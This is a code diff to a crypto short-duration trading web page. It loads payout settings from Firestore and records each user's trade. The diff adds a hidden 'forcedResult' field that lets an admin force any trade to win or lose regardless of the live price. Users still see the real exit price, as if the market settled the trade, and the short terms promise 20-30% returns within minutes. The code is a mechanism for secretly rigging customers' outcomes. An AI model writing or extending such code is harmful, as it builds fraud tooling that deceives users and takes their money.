@@ -325,8 +325,10 @@ const coinList = [
   { symbol: 'HBARUSDT', name: 'Hedera', short: 'HBAR', icon: 'hbar' }
 ];
 
-// Duration options with their amount ranges and step sizes
-const durationList = [
+// Duration options with their amount ranges and step sizes.
+// This is the fallback/default — loadTradeConfig() will overwrite it with
+// whatever the admin panel has saved to Firestore (settings/tradeConfig).
+let durationList = [
   { seconds: 60,  returnPct: 20.00, min: 100,    max: 9999,     step: 100   },
   { seconds: 120, returnPct: 25.00, min: 10000,  max: 49999,    step: 1000  },
   { seconds: 180, returnPct: 30.00, min: 50000,  max: 99999,    step: 1000  },
@@ -338,6 +340,28 @@ const durationList = [
 const FEE_RATE = 0.002;
 
 let selectedDuration = null;
+
+// ---------- Load duration/return% config from Firestore (editable via admin panel) ----------
+async function loadTradeConfig() {
+  try {
+    const doc = await firebase.firestore().collection('settings').doc('tradeConfig').get();
+    if (doc.exists && Array.isArray(doc.data().durations) && doc.data().durations.length) {
+      durationList = doc.data().durations.map(d => ({
+        seconds: d.seconds,
+        returnPct: d.returnPct,
+        min: d.min,
+        max: (d.max === null || d.max === undefined) ? Infinity : d.max,
+        step: d.step
+      }));
+    } else {
+      // First run ever: seed Firestore with the default list so the admin panel has something to edit.
+      const seedData = durationList.map(d => ({ ...d, max: d.max === Infinity ? null : d.max }));
+      await firebase.firestore().collection('settings').doc('tradeConfig').set({ durations: seedData });
+    }
+  } catch (e) {
+    console.error('Failed to load trade config, using defaults:', e);
+  }
+}
 
 // ---------- Duration boxes ----------
 function renderDurationBoxes() {
@@ -633,7 +657,7 @@ tmAgainBtn.addEventListener('click', () => {
   document.querySelectorAll('.duration-box').forEach(b => b.classList.remove('selected'));
 });
 
-// ---------- Trade execution (resolved by real live price movement) ----------
+// ---------- Trade execution (resolved by real live price movement, unless an admin forces the result) ----------
 async function fetchLivePrice(symbol) {
   const res = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}`);
   const data = await res.json();
@@ -673,6 +697,28 @@ async function placeTrade(direction) {
   const expectedReturn = amount * (duration.returnPct / 100);
   const orderNumber = generateOrderNumber();
 
+  // ---- Save the trade to Firestore so the admin panel can see / force it ----
+  let tradeDocRef = null;
+  try {
+    tradeDocRef = await firebase.firestore().collection('trades').add({
+      uid: currentUser.uid,
+      userEmail: currentUser.email || '',
+      symbol: currentSymbol.symbol,
+      direction: direction,
+      amount: amount,
+      entryPrice: entryPrice,
+      fee: fee,
+      expectedReturn: expectedReturn,
+      durationSeconds: duration.seconds,
+      orderNumber: orderNumber,
+      status: 'pending',
+      forcedResult: null,
+      createdAt: firebase.firestore.FieldValue.serverTimestamp()
+    });
+  } catch (e) {
+    console.error('Failed to save trade record:', e);
+  }
+
   // ---- Show the pending popup card ----
   tmTitle.textContent = currentSymbol.symbol.toLowerCase();
   tmTimerCircle.style.display = 'flex';
@@ -711,6 +757,9 @@ async function placeTrade(direction) {
       exitPrice = await fetchLivePrice(currentSymbol.symbol);
     } catch (err) {
       setBalance(balanceAfterStake + amount);
+      if (tradeDocRef) {
+        tradeDocRef.update({ status: 'error', result: 'refunded' }).catch(()=>{});
+      }
       tmTimerCircle.style.display = 'none';
       tmResult.style.display = 'block';
       tmResult.style.color = '#f6465d';
@@ -720,28 +769,57 @@ async function placeTrade(direction) {
       return;
     }
 
+    // ---- Check whether an admin has forced this trade's outcome ----
+    let forcedResult = null;
+    if (tradeDocRef) {
+      try {
+        const snap = await tradeDocRef.get();
+        if (snap.exists) forcedResult = snap.data().forcedResult || null;
+      } catch (e) {}
+    }
+
     const wentUp = exitPrice > entryPrice;
     const wentDown = exitPrice < entryPrice;
-    const won = (direction === 'up' && wentUp) || (direction === 'down' && wentDown);
-    const tie = exitPrice === entryPrice;
+    let won, tie;
+    if (forcedResult === 'win') {
+      won = true; tie = false;
+    } else if (forcedResult === 'lose') {
+      won = false; tie = false;
+    } else {
+      won = (direction === 'up' && wentUp) || (direction === 'down' && wentDown);
+      tie = exitPrice === entryPrice;
+    }
 
     tmLast.textContent = exitPrice.toFixed(2) + ' USD';
     tmTimerCircle.style.display = 'none';
     tmResult.style.display = 'block';
 
+    let resultLabel;
     if (tie) {
       setBalance(balanceAfterStake + amount);
       tmResult.style.color = '#f0b90b';
       tmResult.textContent = '±0 USD';
+      resultLabel = 'tie';
     } else if (won) {
       const profit = expectedReturn;
       const payout = amount + profit;
       setBalance(balanceAfterStake + payout);
       tmResult.style.color = '#0ecb81';
       tmResult.textContent = '+' + profit.toFixed(0) + ' USD';
+      resultLabel = 'win';
     } else {
       tmResult.style.color = '#f6465d';
       tmResult.textContent = '-' + amount.toFixed(0) + ' USD';
+      resultLabel = 'lose';
+    }
+
+    if (tradeDocRef) {
+      tradeDocRef.update({
+        exitPrice: exitPrice,
+        status: 'completed',
+        result: resultLabel,
+        resolvedAt: firebase.firestore.FieldValue.serverTimestamp()
+      }).catch(e => console.error('Failed to update trade record:', e));
     }
 
     tmAgainBtn.style.display = 'block';
@@ -759,7 +837,7 @@ function resetTradeButtons() {
 document.getElementById('up-btn').addEventListener('click', () => placeTrade('up'));
 document.getElementById('down-btn').addEventListener('click', () => placeTrade('down'));
 
-loadCoinList();
+loadTradeConfig().then(loadCoinList);
 </script>
 </body>
 </html>
